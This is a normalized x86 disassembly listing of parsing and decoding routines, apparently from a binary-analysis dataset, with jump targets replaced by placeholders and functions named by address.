jne r-xdata
cmp eax 0x100
lea esi [ eax + 0x1 ]
mov [ ecx + 0x8 ] esi
jne r-xdata
mov [ ebp ] eax
mov [ ecx + 0x8 ] eax
add eax 0xfffffff8
shr [ edi + 0x3c ] 0x8
mov [ edi + 0x48 ] eax
mov ecx [ edi + 0x30 ]
add eax 0xfffffff8
mov [ edi + 0x48 ] eax
movzx esi [ ecx ]
mov ecx 0x8
sub cl al
shr esi cl
mov [ edi + 0x3c ] esi
jmp r-xdata
mov eax [ edi + 0x30 ]
movzx edx [ eax ]
mov ecx [ edi + 0x48 ]
shl edx cl
add ecx esi
mov [ edi + 0x48 ] ecx
or [ edi + 0x3c ] edx
cmp ecx esi
jl r-xdata
mov edx [ edi + 0x24 ]
lea eax [ edi + 0x24 ]
push eax
call edx
add esp 0x4
mov ecx [ edi + 0x30 ]
mov [ edi + 0x48 ] 0x7
movzx eax [ ecx ]
mov [ edi + 0x3c ] eax
lea eax [ edi + 0x24 ]
push eax
mov eax [ eax ]
call eax
add esp 0x4
shr [ edi + 0x3c ] 0x1
and eax 0x1
test eax eax
jne r-xdata
add eax 0xfffffff8
shr [ edi + 0x3c ] 0x8
mov [ edi + 0x48 ] eax
mov ecx [ edi + 0x30 ]
add eax 0xfffffff8
mov [ edi + 0x48 ] eax
movzx ebx [ ecx ]
mov ecx 0x8
sub cl al
shr ebx cl
mov [ edi + 0x3c ] ebx
jmp r-xdata
mov eax [ edi + 0x30 ]
movzx edx [ eax ]
mov ecx [ edi + 0x48 ]
shl edx cl
add ecx ebx
mov [ edi + 0x48 ] ecx
or [ edi + 0x3c ] edx
cmp ecx ebx
jl r-xdata
mov edx [ edi + 0x24 ]
lea eax [ edi + 0x24 ]
push eax
call edx
add esp 0x4
mov ecx [ edi + 0x30 ]
mov [ edi + 0x48 ] 0x7
movzx eax [ ecx ]
mov [ edi + 0x3c ] eax
lea eax [ edi + 0x24 ]
push eax
mov eax [ eax ]
call eax
add esp 0x4
shr [ edi + 0x3c ] 0x1
and eax 0x1
test eax eax
jne r-xdata
mov ecx [ eax ]
sub [ esp + 0x2c ] 0x1
test ecx ecx
jle r-xdata
xor ecx ebp
jl r-xdata
cmp edx [ esp + 0x28 ]
lea esi [ edx - 0x1 ]
mov [ eax + 0x8 ] esi
jne r-xdata
cmp edx 0x100
lea esi [ edx + 0x1 ]
mov [ eax + 0x8 ] esi
jne r-xdata
mov [ eax + 0x10 ] edx
xor ecx esi
jl r-xdata
cmp edx [ esp + 0x28 ]
lea ebx [ edx - 0x1 ]
mov [ eax + 0x8 ] ebx
jne r-xdata
cmp edx 0x100
lea ebx [ edx + 0x1 ]
mov [ eax + 0x8 ] ebx
jne r-xdata
cmp ebx [ esp + 0x28 ]
lea esi [ ebx - 0x1 ]
mov [ eax + 0xc ] esi
jne r-xdata
cmp ebx 0x100
lea esi [ ebx + 0x1 ]
mov [ eax + 0xc ] esi
jne r-xdata
add ebx 0x1
add ebx 0xffffffff
jmp r-xdata
jmp r-xdata
xor ecx ebp
jl r-xdata
cmp edx [ esp + 0x28 ]
lea esi [ edx - 0x1 ]
mov [ eax + 0x8 ] esi
jne r-xdata
cmp edx 0x200
lea esi [ edx + 0x1 ]
mov [ eax + 0x8 ] esi
jne r-xdata
mov [ eax + 0x10 ] edx
xor ecx esi
jl r-xdata
cmp edx [ esp + 0x28 ]
lea ebx [ edx - 0x1 ]
mov [ eax + 0x8 ] ebx
jne r-xdata
cmp edx 0x200
lea ebx [ edx + 0x1 ]
mov [ eax + 0x8 ] ebx
jne r-xdata
cmp ebx [ esp + 0x28 ]
lea esi [ ebx - 0x1 ]
mov [ eax + 0xc ] esi
jne r-xdata
cmp ebx 0x200
lea esi [ ebx + 0x1 ]
mov [ eax + 0xc ] esi
jne r-xdata
add ebx 0x1
add ebx 0xffffffff
jmp r-xdata
cmp [ eax - 0x2 ] 0xff
jne r-xdata
jmp r-xdata
mov ecx [ esp + 0x30 ]
shl ebx cl
mov ecx [ esp + 0x20 ]
mov ecx [ esp + 0x20 ]
cmp ebx ecx
jle r-xdata
mov ebx [ esp + 0x3c ]
jmp r-xdata
mov [ esp + 0x24 ] 0x1
cmp ebp [ esp + 0x38 ]
jle r-xdata
mov ecx [ esp + 0x20 ]
mov esi ecx
neg esi
cmp ebp esi
jge r-xdata
shl eax cl
cmp edx [ esp + 0x28 ]
lea esi [ edx - 0x1 ]
mov [ ecx + 0xc ] esi
jne r-xdata
cmp edx 0x100
lea esi [ edx + 0x1 ]
mov [ ecx + 0xc ] esi
jne r-xdata
add esi 0x1
add esi 0xffffffff
jmp r-xdata
add [ edi + 0x8a0 ] 0x1
mov [ edi + 0x89c ] edx
mov [ edi + 0x8a0 ] 0x0
jmp r-xdata
and edx 0xff
cmp edx [ edi + 0x89c ]
je r-xdata
mov eax [ edi + 0x89c ]
mov edx [ esp + 0x14 ]
mov esi [ esp + 0x18 ]
sar eax 0x4
shl ebx 0x4
add eax ebx
mov [ edx ] eax
mov ecx [ edi + 0x89c ]
and ecx 0xf
shl ebp 0x4
add ecx ebp
add edx 0x4
lea eax [ eax + esi * 2 ]
add eax esi
mov [ edx ] ecx
lea ecx [ ecx + eax * 2 ]
add ecx eax
add edx 0x4
mov [ esp + 0x18 ] ecx
mov [ esp + 0x14 ] edx
jmp r-xdata
add [ edi + 0x8a0 ] 0x1
mov [ edi + 0x89c ] edx
mov [ edi + 0x8a0 ] 0x0
jmp r-xdata
and edx 0xff
cmp edx [ edi + 0x89c ]
je r-xdata
mov eax [ edi + 0x89c ]
mov edx [ esp + 0x14 ]
sar eax 0x4
shl ebp 0x4
add eax ebp
mov [ edx ] eax
mov ecx [ edi + 0x89c ]
and ecx 0xf
shl esi 0x4
add ecx esi
mov esi [ esp + 0x18 ]
add edx 0x4
lea eax [ eax + esi * 2 ]
add eax esi
mov [ edx ] ecx
lea ecx [ ecx + eax * 2 ]
add ecx eax
add edx 0x4
mov [ esp + 0x18 ] ecx
mov [ esp + 0x14 ] edx
jmp r-xdata
cmp ebx [ esp + 0x28 ]
lea ecx [ ebx - 0x1 ]
mov [ eax + 0xc ] ecx
jne r-xdata
cmp ebx 0x100
lea ecx [ ebx + 0x1 ]
mov [ eax + 0xc ] ecx
jne r-xdata
add esi 0x1
add esi 0xffffffff
jmp r-xdata
cmp ebx [ esp + 0x28 ]
lea ecx [ ebx - 0x1 ]
mov [ eax + 0xc ] ecx
jne r-xdata
cmp ebx 0x100
lea ecx [ ebx + 0x1 ]
mov [ eax + 0xc ] ecx
jne r-xdata
add ebx 0x1
add ebx 0xffffffff
jmp r-xdata
add esi 0x1
add esi 0xffffffff
jmp r-xdata
mov [ eax + 0x8 ] ebx
cmp ebx [ esp + 0x28 ]
lea ecx [ ebx - 0x1 ]
mov [ eax + 0xc ] ecx
jne r-xdata
cmp ebx 0x200
lea ecx [ ebx + 0x1 ]
mov [ eax + 0xc ] ecx
jne r-xdata
add esi 0x1
add esi 0xffffffff
jmp r-xdata
cmp ebx [ esp + 0x28 ]
lea ecx [ ebx - 0x1 ]
mov [ eax + 0xc ] ecx
jne r-xdata
cmp ebx 0x200
lea ecx [ ebx + 0x1 ]
mov [ eax + 0xc ] ecx
jne r-xdata
add ebx 0x1
add ebx 0xffffffff
jmp r-xdata
add esi 0x1
add esi 0xffffffff
jmp r-xdata
mov [ eax + 0x8 ] ebx
cmp edx [ esp + 0x38 ]
jle r-xdata
neg ecx
cmp edx ecx
jge r-xdata
mov ebx [ esp + 0x40 ]
jmp r-xdata
mov [ esp + 0x24 ] 0x1
mov eax [ esp + 0x14 ]
mov [ eax ] ebx
add eax 0x4
cmp edx esi
jge r-xdata
mov ecx [ esp + 0x30 ]
shl ebp cl
mov ecx [ esp + 0x20 ]
mov [ ebx ] ebp
mov ecx [ esp + 0x20 ]
cmp ebp ecx
jle r-xdata
mov esi [ esp + 0x3c ]
mov [ ebx ] esi
jmp r-xdata
mov [ esp + 0x24 ] 0x1
mov eax [ esp + 0x48 ]
jmp r-xdata
add esi 0x1
add esi 0xffffffff
jmp r-xdata
mov [ ecx + 0x8 ] esi
mov eax [ esp + 0x10 ]
add eax 0x1
cmp eax [ esp + 0x88 ]
mov [ esp + 0x10 ] eax
jb r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x1c ]
add eax 0x1
cmp eax [ esp + 0x88 ]
mov [ esp + 0x10 ] eax
jb r-xdata
add ecx 0x1
add ecx 0xffffffff
jmp r-xdata
mov [ eax + 0x8 ] esi
add ecx 0x1
mov [ eax + 0xc ] ecx
add ecx 0xffffffff
mov [ eax + 0xc ] ecx
mov esi edx
jmp r-xdata
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] esi
add ecx 0x1
add ecx 0xffffffff
jmp r-xdata
mov [ eax + 0x8 ] esi
add ecx 0x1
mov [ eax + 0xc ] ecx
add ecx 0xffffffff
mov [ eax + 0xc ] ecx
mov esi edx
jmp r-xdata
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] esi
mov ecx [ esp + 0x30 ]
shl edx cl
cmp edx ecx
jle r-xdata
mov ecx [ esp + 0x3c ]
mov [ eax ] ecx
jmp r-xdata
mov [ esp + 0x24 ] 0x1
cmp eax [ esp + 0x38 ]
jle r-xdata
neg ecx
cmp eax ecx
jge r-xdata
mov esi [ esp + 0x40 ]
mov [ ebx ] esi
jmp r-xdata
mov [ esp + 0x24 ] 0x1
add ebx 0x4
cmp eax edx
jge r-xdata
mov [ ecx + 0xc ] esi
mov [ eax + 0xc ] ecx
mov [ eax + 0xc ] ecx
jmp r-xdata
mov edx [ esp + 0x40 ]
jmp r-xdata
mov [ esp + 0x24 ] 0x1
add eax 0x4
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x10 ]
add eax 0x1
cmp eax [ esp + 0x88 ]
mov [ esp + 0x10 ] eax
jb r-xdata
mov ecx [ esp + 0x30 ]
cmp eax ecx
jle r-xdata
mov eax [ esp + 0x3c ]
jmp r-xdata
mov [ esp + 0x24 ] 0x1
mov [ eax ] edx
mov ecx [ esp + 0x40 ]
mov [ ebx ] ecx
jmp r-xdata
mov [ esp + 0x24 ] 0x1
mov [ ebx ] eax
mov eax [ esp + 0x10 ]
add eax 0x1
add ebx 0x4
cmp eax [ esp + 0x88 ]
mov [ esp + 0x14 ] ebx
mov [ esp + 0x10 ] eax
jb r-xdata
sub_4093a0
mov ecx [ esp + 0x4 ]
cmp [ ecx + 0x14 ] 0x10
jae r-xdata
mov eax [ ecx + 0x8 ]
sub eax [ ecx ]
sar eax 0x1
add eax eax
test al 0x1
jne r-xdata
add [ ecx + 0x8 ] 0x2
xor edx edx
mov [ ecx ] edx
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x8 ] edx
mov [ ecx + 0xc ] edx
mov [ ecx + 0x10 ] edx
mov [ ecx + 0x14 ] edx
mov [ ecx + 0x18 ] edx
retn
add eax 0x1
sub_4093e0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
mov al [ edi ]
test al al
je r-xdata
pop edi
pop esi
retn
cmp al 0x4c
je r-xdata
movzx ecx [ esi + 0x3 ]
movzx edx [ esi + 0x2 ]
movzx eax [ esi + 0x1 ]
shl ecx 0x8
add ecx edx
movzx edx [ esi ]
shl ecx 0x8
add ecx eax
shl ecx 0x8
add ecx edx
mov [ esi ] ecx
add esi 0x4
cmp al 0x53
je r-xdata
movzx dx [ esi + 0x1 ]
movzx ax [ esi ]
shl dx 0x8
add dx ax
mov [ esi ] dx
add esi 0x2
jmp r-xdata
movsx eax al
push eax
call sub_411648
add esp 0x4
test eax eax
je r-xdata
mov al [ edi + 0x1 ]
add edi 0x1
test al al
jne r-xdata
movsx ecx [ edi ]
lea esi [ esi + ecx - 0x30 ]
jmp r-xdata
sub_409460
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
mov al [ edi ]
test al al
je r-xdata
pop edi
pop esi
retn
cmp al 0x4c
je r-xdata
mov eax [ esi ]
mov [ esi ] al
mov edx eax
add esi 0x1
sar edx 0x8
mov ecx eax
mov [ esi ] dl
add esi 0x1
sar ecx 0x10
mov [ esi ] cl
sar eax 0x18
cmp al 0x53
je r-xdata
movsx eax [ esi ]
mov [ esi ] al
sar eax 0x8
jmp r-xdata
movsx eax al
push eax
call sub_411648
add esp 0x4
test eax eax
je r-xdata
add esi 0x1
mov [ esi ] al
add esi 0x1
mov al [ edi + 0x1 ]
add edi 0x1
test al al
jne r-xdata
movsx ecx [ edi ]
lea esi [ esi + ecx - 0x30 ]
jmp r-xdata
sub_4094d0
mov eax [ esp + 0x4 ]
xor ecx ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] ecx
mov [ eax + 0x10 ] ecx
mov ecx [ esp + 0x8 ]
mov [ eax ] ecx
add ecx 0xfffffffe
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xc ] sub_409380
retn
sub_409500
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x4 ]
push esi
lea esi [ ecx + eax + 0x8 ]
mov eax [ esp + 0x10 ]
push edi
mov edi [ eax ]
mov edx esi
sub edx edi
cmp edx 0x2
jl r-xdata
pop edi
xor eax eax
pop esi
retn
movzx edx [ edi ]
mov ecx [ esp + 0xc ]
mov [ ecx + 0x8 ] dl
add [ eax ] 0x1
mov edx [ eax ]
movzx edx [ edx ]
add edx edx
mov [ ecx ] edx
add [ eax ] 0x1
mov dl [ ecx + 0x8 ]
test dl dl
jns r-xdata
mov dl [ ecx + 0x8 ]
test dl 0x40
je r-xdata
and dl 0x7f
mov [ ecx + 0x8 ] dl
mov edx [ eax ]
mov edi esi
sub edi edx
cmp edi 0x2
jl r-xdata
mov edx [ ecx ]
test edx edx
je r-xdata
and dl 0xbf
add [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] dl
movzx edx [ edx ]
shl edx 0x9
add [ ecx ] edx
add [ eax ] 0x1
mov edx [ eax ]
movzx edx [ edx ]
shl edx 0x11
add [ ecx ] edx
add [ eax ] 0x1
pop edi
mov [ ecx + 0x4 ] 0x0
mov eax 0x1
pop esi
retn
mov edi edx
and edi 0x1
add edx edi
mov edi [ eax ]
sub esi edi
cmp esi edx
jge r-xdata
mov [ ecx + 0x4 ] edi
add [ eax ] edx
pop edi
mov eax 0x1
pop esi
retn
mov [ ecx + 0x4 ] 0x0
sub_4095c0
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x170 ]
mov ecx [ esp + 0x8 ]
push esi
mov esi [ edx + eax * 4 + 0x17c ]
movzx eax [ ecx + 0x8 ]
cmp eax 0x27
push edi
ja r-xdata
shr eax 0x5
and eax 0x1
movzx edi [ eax + lookup_table_409748 ]
jmp [ edi * 4 + jump_table_409700 ]
pop edi
mov eax 0x1
pop esi
retn
push ecx
push esi
call sub_409a70
add esp 0x8
pop edi
pop esi
retn
push ecx
push esi
call sub_409af0
add esp 0x8
pop edi
pop esi
retn
push ecx
push esi
call sub_409ba0
add esp 0x8
pop edi
pop esi
retn
push ecx
push esi
call sub_40c830
add esp 0x8
pop edi
pop esi
retn
push ecx
push esi
call sub_40c9a0
add esp 0x8
pop edi
pop esi
retn
push ecx
push esi
call sub_409de0
add esp 0x8
pop edi
pop esi
retn
push ecx
push esi
call sub_40d7f0
add esp 0x8
pop edi
pop esi
retn
push ecx
push esi
call sub_409f50
add esp 0x8
pop edi
pop esi
retn
pop edi
pop esi
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
jmp sub_409fa0
pop edi
pop esi
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
jmp sub_40a000
pop edi
pop esi
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
jmp sub_40a050
push ecx
push esi
call sub_4099b0
add esp 0x8
pop edi
pop esi
retn
push ecx
push esi
call sub_4099e0
add esp 0x8
pop edi
pop esi
retn
push ecx
push esi
call sub_409a10
add esp 0x8
pop edi
pop esi
retn
pop edi
pop esi
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
jmp sub_40a090
cmp [ ecx ] 0x10
mov eax 0x1
jne r-xdata
pop edi
pop esi
retn
mov ecx [ ecx + 0x4 ]
mov esi [ ecx ]
mov [ edx + 0x34 ] esi
mov esi [ ecx + 0x4 ]
mov [ edx + 0x38 ] esi
mov esi [ ecx + 0x8 ]
mov [ edx + 0x3c ] esi
mov ecx [ ecx + 0xc ]
or [ edx + 0x14 ] 0x8000000
pop edi
mov [ edx + 0x40 ] ecx
mov [ edx + 0x44 ] al
pop esi
retn
sub_409770
sub esp 0x10
push ebx
push esi
mov esi [ esp + 0x1c ]
mov eax [ esi + 0x170 ]
mov ebx [ esi + eax * 4 + 0x17c ]
mov [ ebx + 0x88 ] 0x0
or eax 0xffffffff
mov [ ebx + 0xb0 ] eax
mov [ ebx + 0xac ] eax
xor eax eax
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0xbc ] eax
mov [ ebx + 0xc0 ] eax
mov [ ebx + 0xc4 ] eax
mov [ ebx + 0xc8 ] eax
mov [ ebx + 0xcc ] eax
mov [ ebx + 0xd0 ] eax
mov [ ebx + 0xd4 ] eax
mov [ ebx + 0xd8 ] eax
mov [ ebx + 0xdc ] eax
mov [ ebx + 0xe0 ] eax
mov [ ebx + 0xe4 ] eax
mov [ ebx + 0xe8 ] eax
mov [ ebx + 0xec ] eax
mov [ ebx + 0xf0 ] eax
mov [ ebx + 0xf4 ] eax
mov [ ebx + 0xf8 ] eax
mov [ ebx + 0xfc ] eax
push 0x600
mov [ ebx + 0x100 ] eax
push eax
lea ecx [ ebx + 0x150 ]
mov [ ebx + 0x104 ] eax
push ecx
mov [ ebx + 0x108 ] eax
call sub_40fb30
push 0x30
lea edx [ ebx + 0x120 ]
push 0x0
push edx
call sub_40fb30
push 0x4c
lea eax [ ebx + 0x20 ]
push 0x0
push eax
call sub_40fb30
add esp 0x24
test [ ebx + 0x18 ] 0x80000000
jne r-xdata
pop esi
mov [ ebx + 0x88 ] 0x1
xor eax eax
pop ebx
add esp 0x10
retn
mov ecx [ ebx + 0x6c ]
add ecx 0x20
mov [ esp + 0x1c ] ecx
mov eax [ ebx + 0x6c ]
lea edx [ esp + 0x1c ]
push edx
push eax
lea ecx [ esp + 0x14 ]
push ecx
call sub_409500
add esp 0xc
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
je r-xdata
lea edx [ esp + 0xc ]
push edx
push esi
call sub_4095c0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebx + 0x14 ]
test ecx ecx
je r-xdata
cmp [ esi + 0x98 ] 0x0
je r-xdata
mov ecx [ ebx + 0x6c ]
lea eax [ esp + 0x1c ]
push eax
push ecx
lea edx [ esp + 0x14 ]
push edx
call sub_409500
add esp 0xc
test eax eax
jne r-xdata
test ecx ecx
mov eax 0x1
je r-xdata
cmp [ ebx + 0xc0 ] 0x0
jne r-xdata
mov eax [ ebx + 0x74 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
je r-xdata
cmp [ ebx + 0xf8 ] 0x0
jne r-xdata
cmp [ ebx + 0xdc ] 0x0
je r-xdata
add eax 0x20
mov [ esp + 0x8 ] eax
mov ecx [ ebx + 0x74 ]
lea eax [ esp + 0x8 ]
push eax
push ecx
lea edx [ esp + 0x14 ]
push edx
call sub_409500
add esp 0xc
test eax eax
je r-xdata
pop esi
pop ebx
add esp 0x10
retn
mov ecx [ ebx + 0x10 ]
mov [ ebx + 0xa8 ] ecx
test [ ebx + 0x18 ] 0x100
je r-xdata
push edi
lea edi [ esi + 0x1a0 ]
mov ecx 0x9
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop edi
lea esp [ esp ]
test [ ebx + 0x18 ] 0x80
je r-xdata
cmp [ ebx + 0x118 ] 0x0
je r-xdata
mov edx [ ebx + 0x74 ]
lea ecx [ esp + 0x8 ]
push ecx
push edx
lea eax [ esp + 0x14 ]
push eax
call sub_409500
add esp 0xc
test eax eax
jne r-xdata
test [ ebx + 0x11c ] 0x2e
je r-xdata
mov [ esi + 0xa8 ] eax
lea eax [ esp + 0xc ]
push eax
push esi
call sub_4095c0
add esp 0x8
test eax eax
je r-xdata
mov [ esi + 0xa8 ] eax
sub_4099b0
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
mov edx [ esp + 0x4 ]
add ecx eax
push ecx
push eax
add edx 0xb8
push edx
call sub_4094d0
add esp 0xc
mov eax 0x1
retn
sub_4099e0
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
mov edx [ esp + 0x4 ]
add ecx eax
push ecx
push eax
add edx 0xd4
push edx
call sub_4094d0
add esp 0xc
mov eax 0x1
retn
sub_409a10
mov ecx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
mov eax [ esi + 0x4 ]
movzx edx [ eax ]
mov [ ecx + 0xb4 ] edx
xor edx edx
mov dh [ eax + 0x1 ]
add eax 0x1
add eax 0x1
add eax 0x1
add eax 0x1
add ecx 0xf0
or [ ecx - 0x3c ] edx
movzx edx [ eax - 0x2 ]
shl edx 0x10
or [ ecx - 0x3c ] edx
movzx edx [ eax - 0x1 ]
shl edx 0x18
or [ ecx - 0x3c ] edx
mov edx [ esi ]
add edx [ esi + 0x4 ]
push edx
push eax
push ecx
call sub_4094d0
add esp 0xc
mov eax 0x1
pop esi
retn
sub_409a70
mov eax [ esp + 0x8 ]
mov edx [ eax ]
cmp edx 0x10
push esi
mov esi [ eax + 0x4 ]
jle r-xdata
mov eax [ esp + 0x8 ]
lea ecx [ edx + edx * 2 ]
shl ecx 0x5
test edx edx
mov [ eax + 0x84 ] edx
lea eax [ ecx + eax + 0xf0 ]
je r-xdata
xor eax eax
pop esi
retn
mov eax 0x1
pop esi
retn
mov edi edi
cmp ecx 0xfffffffd
jl r-xdata
cmp ecx 0x8
jle r-xdata
cmp ecx 0x12
jg r-xdata
cmp ecx 0x11
jl r-xdata
sub eax 0x60
test edx edx
jne r-xdata
movzx ecx [ esi ]
and ecx 0x1f
sub ecx 0x5
mov [ eax ] ecx
movzx ecx [ esi ]
shr ecx 0x5
mov [ eax + 0x4 ] ecx
mov ecx [ eax ]
sub edx 0x1
add esi 0x1
test ecx ecx
je r-xdata
sub_409af0
mov eax [ esp + 0x8 ]
mov edx [ eax ]
push ebx
mov ebx [ esp + 0x8 ]
test [ ebx + 0x18 ] 0x40000004
push edi
mov edi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx + 0x84 ]
cmp edx eax
jle r-xdata
mov eax edx
cdq
sub eax edx
sar eax 0x1
mov edx eax
push ebp
xor ecx ecx
cmp eax ecx
lea ebp [ ebx + 0x150 ]
push esi
mov esi ebp
je r-xdata
pop edi
xor eax eax
pop ebx
retn
sub esi 0x60
cmp esi ebp
jb r-xdata
sub eax 0x1
mov [ esi + 0xc ] ecx
mov [ esi + 0x8 ] ecx
add esi 0x60
cmp eax ecx
jne r-xdata
pop esi
pop ebp
pop edi
mov eax 0x1
pop ebx
retn
jmp r-xdata
mov eax edx
sub edx 0x1
test eax eax
mov [ esp + 0x18 ] edx
je r-xdata
movzx eax [ edi ]
push eax
call sub_40c810
add esp 0x4
mov [ esi + 0x8 ] eax
add edi 0x1
test [ ebx + 0x18 ] 0x40000004
jne r-xdata
sub esi 0x60
cmp esi ebp
jae r-xdata
movzx eax [ edi ]
push eax
call sub_40c810
add esp 0x4
mov [ esi + 0xc ] eax
add edi 0x1
mov edx [ esp + 0x18 ]
sub_409ba0
mov eax [ esp + 0x8 ]
push ebx
mov ebx [ esp + 0x8 ]
mov ecx [ ebx + 0x84 ]
push ebp
mov ebp [ eax ]
push esi
push edi
mov edi [ eax + 0x4 ]
add ebp edi
test ecx ecx
mov [ esp + 0x18 ] ebp
lea esi [ ebx + 0x150 ]
je r-xdata
cmp [ ebx + 0x8 ] 0x402
jne r-xdata
xor eax eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] eax
mov [ esi + 0x48 ] eax
sub ecx 0x1
mov [ esi + 0x4c ] eax
add esi 0x60
test ecx ecx
jne r-xdata
lea eax [ ebx + 0x150 ]
cmp esi eax
jbe r-xdata
test [ ebx + 0x18 ] 0x8
je r-xdata
xor eax eax
cmp edi ebp
pop edi
pop esi
pop ebp
sete al
pop ebx
retn
sub esi 0x60
cmp edi ebp
jae r-xdata
movzx ax [ edi + 0x1 ]
movzx cx [ edi ]
shl ax 0x8
add ax cx
movsx edx ax
push edx
call sub_40c7c0
add esp 0x4
add edi 0x2
test [ ebx + 0x18 ] 0x40000004
mov [ ebx + 0x130 ] eax
jne r-xdata
mov eax [ esi ]
cmp eax 0x8
jle r-xdata
movzx ax [ edi + 0x1 ]
movzx cx [ edi ]
shl ax 0x8
add ax cx
movsx edx ax
push edx
call sub_40c7c0
add esp 0x4
mov [ ebx + 0x134 ] eax
add edi 0x2
test eax eax
jge r-xdata
movzx eax [ edi + 0x1 ]
movzx ecx [ edi ]
shl ax 0x8
add ax cx
movsx edx ax
push edx
call sub_40c7c0
mov [ esi + 0x10 ] eax
movzx eax [ edi + 0x3 ]
movzx ecx [ edi + 0x2 ]
shl ax 0x8
add ax cx
movsx edx ax
push edx
call sub_40c7c0
add esp 0x8
mov [ esi + 0x14 ] eax
add edi 0x4
test [ ebx + 0x18 ] 0x40000004
jne r-xdata
mov ebp eax
test ebp ebp
je r-xdata
movzx eax [ edi + 0x1 ]
movzx ecx [ edi ]
shl ax 0x8
add ax cx
movsx edx ax
push edx
call sub_40c7c0
mov [ esi + 0x10 ] eax
movzx eax [ edi + 0x3 ]
movzx ecx [ edi + 0x2 ]
shl ax 0x8
add ax cx
movsx edx ax
push edx
call sub_40c7c0
add esp 0x8
mov [ esi + 0x30 ] eax
add edi 0x4
jmp r-xdata
lea eax [ ebx + 0x150 ]
cmp esi eax
ja r-xdata
movzx eax [ edi + 0x1 ]
movzx ecx [ edi ]
shl ax 0x8
add ax cx
movsx edx ax
push edx
call sub_40c7c0
mov [ esi + 0x30 ] eax
movzx eax [ edi + 0x3 ]
movzx ecx [ edi + 0x2 ]
shl ax 0x8
add ax cx
movsx edx ax
push edx
call sub_40c7c0
add esp 0x8
mov [ esi + 0x34 ] eax
add edi 0x4
jmp r-xdata
mov ebp [ esp + 0x18 ]
lea ebx [ esi + 0x30 ]
lea ebx [ ebx ]
add ebx 0x4
test ebp ebp
jne r-xdata
movzx cx [ edi + 0x1 ]
movzx dx [ edi ]
shl cx 0x8
add cx dx
movsx eax cx
push eax
call sub_40c7c0
add esp 0x4
mov [ ebx ] eax
add edi 0x2
movzx ax [ edi + 0x1 ]
movzx cx [ edi ]
shl ax 0x8
add ax cx
movsx edx ax
push edx
sub ebp 0x1
call sub_40c7c0
mov [ ebx - 0x20 ] eax
mov eax [ esp + 0x18 ]
add esp 0x4
add edi 0x2
test [ eax + 0x18 ] 0x40000004
jne r-xdata
mov ebx [ esp + 0x14 ]
sub_409de0
push ebx
mov ebx [ esp + 0xc ]
mov eax [ ebx ]
cmp eax 0x2
push esi
push edi
jne r-xdata
mov edi [ esp + 0x10 ]
mov ecx [ edi + 0x18 ]
and ecx 0x40000004
neg ecx
sbb ecx ecx
and ecx 0xfffffffc
add ecx 0x8
cmp eax ecx
jl r-xdata
mov esi [ ebx + 0x4 ]
movzx eax [ esi ]
push eax
call sub_40c810
mov edi [ esp + 0x14 ]
shl eax 0x10
mov [ edi + 0x120 ] eax
movzx eax [ esi + 0x1 ]
push eax
call sub_40c810
add esp 0x8
shl eax 0x10
mov [ edi + 0x124 ] eax
pop edi
pop esi
mov eax 0x1
pop ebx
retn
pop edi
pop esi
xor eax eax
pop ebx
retn
mov esi [ ebx + 0x4 ]
movzx edx [ esi + 0x1 ]
movzx eax [ esi ]
shl dx 0x8
add dx ax
movsx ecx dx
push ecx
call sub_40c7c0
mov [ edi + 0x130 ] eax
movzx edx [ esi + 0x3 ]
movzx eax [ esi + 0x2 ]
shl dx 0x8
add dx ax
movsx ecx dx
push ecx
call sub_40c7c0
add esp 0x8
add esi 0x4
test [ edi + 0x18 ] 0x40000004
mov [ edi + 0x120 ] eax
jne r-xdata
mov edx [ edi + 0x18 ]
and edx 0x40000004
neg edx
sbb edx edx
and edx 0xfffffffa
add edx 0xc
cmp [ ebx ] edx
jne r-xdata
movzx edx [ esi + 0x1 ]
movzx eax [ esi ]
shl dx 0x8
add dx ax
movsx ecx dx
push ecx
call sub_40c7c0
mov [ edi + 0x134 ] eax
movzx edx [ esi + 0x3 ]
movzx eax [ esi + 0x2 ]
shl dx 0x8
add dx ax
movsx ecx dx
push ecx
call sub_40c7c0
add esp 0x8
mov [ edi + 0x124 ] eax
add esi 0x4
pop edi
pop esi
mov eax 0x1
pop ebx
retn
movzx ax [ esi + 0x1 ]
movzx cx [ esi ]
shl ax 0x8
add ax cx
movsx edx ax
push edx
call sub_40c7c0
add esp 0x4
test [ edi + 0x18 ] 0x40000004
mov [ edi + 0x128 ] eax
jne r-xdata
movzx ax [ esi + 0x3 ]
movzx cx [ esi + 0x2 ]
shl ax 0x8
add ax cx
movsx edx ax
push edx
call sub_40c7c0
add esp 0x4
